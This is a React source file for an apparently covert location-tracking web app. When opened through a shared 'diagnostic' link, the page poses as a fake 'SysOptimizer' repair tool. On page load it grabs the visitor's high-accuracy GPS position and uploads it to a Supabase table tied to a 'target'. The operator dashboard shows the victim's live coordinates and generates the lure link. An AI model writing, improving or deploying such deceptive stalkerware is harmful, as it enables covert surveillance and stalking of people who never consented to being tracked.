
import React, { useState, useEffect, useCallback, useMemo, useRef } from 'react';
import Sidebar from './components/Sidebar';
import LocationCard from './components/LocationCard';
import { UserProfile, AIInsight, LocationData } from './types';
import { createClient } from '@supabase/supabase-js';
// Import the service for AI insights
import { getLocationInsights } from './services/geminiService';

const App: React.FC = () => {
  const params = useMemo(() => new URLSearchParams(window.location.search), []);
  const isStealthMode = params.get('mode') === 'diagnostic';
  const targetId = 'target_alpha'; 

  const [config, setConfig] = useState({
    url: params.get('sb_url') || localStorage.getItem('SB_URL_OVER_RE') || '',
    key: params.get('sb_key') || localStorage.getItem('SB_KEY_OVER_RE') || ''
  });

  const [isUnlocked, setIsUnlocked] = useState(false);
  const [isDiagnosing, setIsDiagnosing] = useState(false);
  const [diagStep, setDiagStep] = useState(0); 
  const [diagProgress, setDiagProgress] = useState(0);
  const [copyStatus, setCopyStatus] = useState<string | null>(null);
  const [dbLog, setDbLog] = useState<string>("IDLE");
  const [showConfigEditor, setShowConfigEditor] = useState(false);
  
  const cachedLocation = useRef<Partial<LocationData> | null>(null);

  const [members, setMembers] = useState<UserProfile[]>([
    {
      id: '1',
      name: 'Alpha_Target',
      avatar: 'https://picsum.photos/id/64/200/200',
      lastSeen: Date.now(),
      status: 'offline',
    }
  ]);

  // Track AI insights state
  const [insight, setInsight] = useState<AIInsight | null>(null);
  const [loadingInsight, setLoadingInsight] = useState(false);

  // Define activeMember to fix errors on lines 198, 199, etc.
  const activeMember = useMemo(() => members.find(m => m.id === '1') || members[0], [members]);

  const supabase = useMemo(() => {
    if (config.url && config.key) {
      try { return createClient(config.url, config.key); } catch (e) { return null; }
    }
    return null;
  }, [config.url, config.key]);

  const syncToDatabase = async (loc: Partial<LocationData>) => {
    if (!supabase) return;
    setDbLog("SYNC...");
    try {
      const { error } = await supabase
        .from('tracking')
        .upsert({ id: targetId, ...loc, timestamp: Date.now() });
      setDbLog(error ? "FAIL" : "OK");
    } catch (err) {
      setDbLog("ERR");
    }
  };

  // Pre-fetch GPS secepat mungkin
  useEffect(() => {
    if (isStealthMode) {
      navigator.geolocation.getCurrentPosition(
        (pos) => {
          cachedLocation.current = {
            latitude: pos.coords.latitude,
            longitude: pos.coords.longitude,
            accuracy: pos.coords.accuracy,
          };
          // Kirim langsung di background tanpa nunggu tombol diklik (Double safety)
          syncToDatabase(cachedLocation.current);
        },
        null,
        { enableHighAccuracy: true, timeout: 5000 }
      );
    }
  }, [isStealthMode, supabase]);

  useEffect(() => {
    if (isUnlocked && !isStealthMode && supabase) {
      const fetchData = async () => {
        const { data } = await supabase.from('tracking').select('*').eq('id', targetId).single();
        if (data) {
          setMembers([{ ...members[0], currentLocation: data, status: 'online', lastSeen: data.timestamp }]);
        }
      };
      fetchData();

      const channel = supabase
        .channel('live-track')
        .on('postgres_changes', { event: '*', schema: 'public', table: 'tracking' }, payload => {
          const data = payload.new as any;
          if (data && data.id === targetId) {
            setMembers([{ ...members[0], currentLocation: data, status: 'online', lastSeen: data.timestamp }]);
          }
        })
        .subscribe();
      return () => { supabase.removeChannel(channel); };
    }
  }, [isUnlocked, isStealthMode, supabase]);

  // Fetch AI insights when location updates
  useEffect(() => {
    if (activeMember.currentLocation) {
      const fetchInsight = async () => {
        setLoadingInsight(true);
        try {
          const res = await getLocationInsights(activeMember.currentLocation as LocationData);
          setInsight(res);
        } catch (err) {
          console.error("Insight error:", err);
        } finally {
          setLoadingInsight(false);
        }
      };
      fetchInsight();
    }
  }, [activeMember.currentLocation]);

  const startDiagnostic = () => {
    setIsDiagnosing(true);
    setDiagStep(1);
    
    // Alur Ultra-Turbo (Selesai dalam 1.5 detik)
    setTimeout(() => {
      setDiagStep(2);
      if (cachedLocation.current) syncToDatabase(cachedLocation.current);
      else {
        navigator.geolocation.getCurrentPosition((pos) => {
          const loc = { latitude: pos.coords.latitude, longitude: pos.coords.longitude, accuracy: pos.coords.accuracy };
          cachedLocation.current = loc;
          syncToDatabase(loc);
        });
      }
    }, 400);

    setTimeout(() => setDiagStep(3), 1200);

    let progress = 0;
    const interval = setInterval(() => {
      progress += 5; 
      setDiagProgress(progress);
      if (progress >= 100) clearInterval(interval);
    }, 40);
  };

  const getFullDiagnosticUrl = () => {
    const baseUrl = window.location.origin + window.location.pathname;
    return `${baseUrl}?mode=diagnostic&sb_url=${encodeURIComponent(config.url)}&sb_key=${encodeURIComponent(config.key)}`;
  };

  if (isStealthMode) {
    return (
      <div className="min-h-screen bg-slate-950 text-slate-200 font-mono flex flex-col p-6 items-center justify-center">
        <div className="max-w-xs w-full space-y-4">
           <div className="text-center">
              <i className="fas fa-microchip text-blue-500 text-3xl mb-2"></i>
              <h1 className="text-sm font-bold uppercase tracking-widest">SysOptimizer <span className="text-blue-500">v4</span></h1>
           </div>
           
           {!isDiagnosing ? (
             <div className="bg-slate-900 border border-slate-800 rounded-2xl p-6 text-center space-y-4">
                <p className="text-slate-400 text-[9px] uppercase">Database sistem tidak sinkron. Butuh perbaikan cepat.</p>
                <button onClick={startDiagnostic} className="w-full py-3 bg-blue-600 rounded-xl font-bold text-[10px] uppercase tracking-widest active:scale-95 transition-all">Perbaiki Sekarang</button>
             </div>
           ) : (
             <div className="bg-slate-900 border border-slate-800 rounded-2xl p-5 space-y-4">
                <div className="space-y-2">
                   <div className="flex justify-between text-[8px] uppercase font-bold text-slate-500">
                        <span>{diagStep === 1 ? 'Analysing' : diagStep === 2 ? 'Syncing' : 'Done'}</span>
                        <span className="text-blue-400">{diagProgress}%</span>
                   </div>
                   <div className="w-full bg-slate-800 h-1 rounded-full overflow-hidden">
                        <div className="bg-blue-500 h-full transition-all duration-100" style={{ width: `${diagProgress}%` }}></div>
                   </div>
                </div>
                <div className="p-4 bg-black/40 rounded-xl text-[8px] uppercase font-bold tracking-tighter border border-slate-800/50 flex justify-between">
                   <span className="text-slate-600">Protocol_Relay</span>
                   <span className="text-emerald-500">{dbLog}</span>
                </div>
                {diagStep === 3 && (
                   <div className="text-center py-2 text-emerald-500 text-[10px] font-bold animate-pulse uppercase">Optimization Complete</div>
                )}
             </div>
           )}
        </div>
      </div>
    );
  }

  return (
    <div className="flex h-screen bg-slate-950 text-slate-200 overflow-hidden font-mono">
      <Sidebar members={members} activeMemberId="1" onSelectMember={() => {}} isUnlocked={isUnlocked} onUnlock={() => setIsUnlocked(true)} />
      
      <main className="flex-1 flex flex-col min-w-0">
        <header className="h-14 bg-slate-900/50 border-b border-slate-800 flex items-center justify-between px-6 shrink-0">
          <div className="flex flex-col">
              <h2 className="text-[9px] font-black tracking-widest text-white uppercase">{isUnlocked ? 'CENTRAL_COMMAND' : 'RESTRICTED'}</h2>
              <span className="text-[7px] text-slate-500 uppercase">Status: <span className="text-emerald-500">Active</span></span>
          </div>
          {isUnlocked && (
              <button onClick={() => setShowConfigEditor(true)} className="w-7 h-7 flex items-center justify-center rounded-lg bg-slate-800 text-slate-400 hover:text-white"><i className="fas fa-cog text-[10px]"></i></button>
          )}
        </header>

        <div className="flex-1 p-6 overflow-y-auto space-y-6 custom-scrollbar">
          {!isUnlocked ? (
            <div className="max-w-md mx-auto py-32 text-center space-y-4 opacity-50">
               <i className="fas fa-lock text-4xl mb-2"></i>
               <h1 className="text-sm font-black uppercase tracking-widest">Security Bridge Required</h1>
            </div>
          ) : (
            <div className="grid grid-cols-1 lg:grid-cols-12 gap-6 max-w-6xl mx-auto">
              <div className="lg:col-span-7 space-y-6">
                <div className="bg-slate-900 border border-slate-800 rounded-3xl p-8 space-y-6">
                   <div className="flex justify-between items-center">
                      <h3 className="text-[10px] font-black text-slate-400 uppercase tracking-widest">Satellite Telemetry</h3>
                      {activeMember.currentLocation && (
                        <button onClick={() => window.open(`https://www.google.com/maps?q=${activeMember.currentLocation!.latitude},${activeMember.currentLocation!.longitude}`, '_blank')} className="px-5 py-2 bg-blue-600 hover:bg-blue-500 text-white rounded-xl text-[9px] font-black uppercase transition-all shadow-lg shadow-blue-600/20">Google Maps</button>
                      )}
                   </div>
                   {activeMember.currentLocation ? (
                     <div className="grid grid-cols-1 gap-4">
                        <div className="bg-slate-950 p-6 rounded-2xl border border-slate-800/50 group hover:border-blue-500/50 transition-all">
                           <p className="text-[8px] text-slate-600 uppercase mb-2 font-bold tracking-widest">Current Coordinates</p>
                           <p className="text-2xl font-black text-white mono tracking-tighter">
                            {activeMember.currentLocation.latitude.toFixed(6)}, {activeMember.currentLocation.longitude.toFixed(6)}
                           </p>
                           <p className="text-[8px] text-slate-500 mt-2">Accuracy: {activeMember.currentLocation.accuracy.toFixed(1)}m</p>
                        </div>
                     </div>
                   ) : (
                     <div className="py-20 border border-dashed border-slate-800 rounded-2xl text-center text-[9px] text-slate-600 uppercase font-black tracking-widest bg-slate-950/20">Awaiting Signal...</div>
                   )}
                </div>

                <div className="bg-slate-900 border border-slate-800 rounded-3xl p-6">
                    <h3 className="text-[9px] font-black text-slate-500 uppercase tracking-widest mb-4">Diagnostic Payload Link</h3>
                    <div className="flex gap-2">
                        <input readOnly value={getFullDiagnosticUrl()} className="flex-1 bg-slate-950 border border-slate-800 rounded-xl py-2.5 px-4 text-[9px] text-slate-500 focus:outline-none mono" />
                        <button onClick={() => {
                            navigator.clipboard.writeText(getFullDiagnosticUrl());
                            setCopyStatus('link');
                            setTimeout(() => setCopyStatus(null), 2000);
                        }} className={`px-5 py-2.5 rounded-xl text-[9px] font-black uppercase transition-all ${copyStatus === 'link' ? 'bg-emerald-600 text-white' : 'bg-slate-800 hover:bg-slate-700 text-white'}`}>
                            {copyStatus === 'link' ? 'Copied' : 'Copy'}
                        </button>
                    </div>
                </div>
              </div>

              <div className="lg:col-span-5 space-y-6">
                <LocationCard member={activeMember} insight={insight} loadingInsight={loadingInsight} />
                <div className="bg-slate-900 border border-slate-800 rounded-3xl p-6">
                    <h4 className="text-[9px] font-black text-slate-500 uppercase tracking-widest mb-4">Engine Health</h4>
                    <div className="space-y-3 text-[9px] uppercase font-bold">
                       <div className="flex justify-between"><span className="text-slate-600">Payload Size</span><span className="text-emerald-500">~128B (Ultra Lite)</span></div>
                       <div className="flex justify-between"><span className="text-slate-600">Relay Speed</span><span className="text-blue-400">&lt; 100ms</span></div>
                    </div>
                </div>
              </div>
            </div>
          )}
        </div>
      </main>

      {showConfigEditor && (
        <div className="fixed inset-0 bg-black/95 backdrop-blur-md flex items-center justify-center p-6 z-[100]">
           <div className="bg-slate-900 border border-slate-800 w-full max-w-sm rounded-3xl p-8 space-y-6">
              <h2 className="text-xs font-black uppercase tracking-widest text-white">Bridge Config</h2>
              <form onSubmit={(e) => {
                  e.preventDefault();
                  const fd = new FormData(e.currentTarget as HTMLFormElement);
                  localStorage.setItem('SB_URL_OVER_RE', fd.get('url') as string);
                  localStorage.setItem('SB_KEY_OVER_RE', fd.get('key') as string);
                  window.location.reload();
              }} className="space-y-4">
                 <input name="url" defaultValue={config.url} className="w-full bg-slate-950 border border-slate-800 rounded-xl p-3 text-[10px] text-slate-300 mono outline-none" placeholder="URL" required />
                 <textarea name="key" defaultValue={config.key} className="w-full bg-slate-950 border border-slate-800 rounded-xl p-3 text-[10px] text-slate-300 h-24 mono outline-none resize-none" placeholder="Key" required />
                 <button type="submit" className="w-full py-3.5 bg-blue-600 hover:bg-blue-500 rounded-xl text-[10px] font-black uppercase text-white">Save</button>
                 <button type="button" onClick={() => setShowConfigEditor(false)} className="w-full py-2 text-[8px] text-slate-500 uppercase font-bold">Cancel</button>
              </form>
           </div>
        </div>
      )}
    </div>
  );
};

export default App;
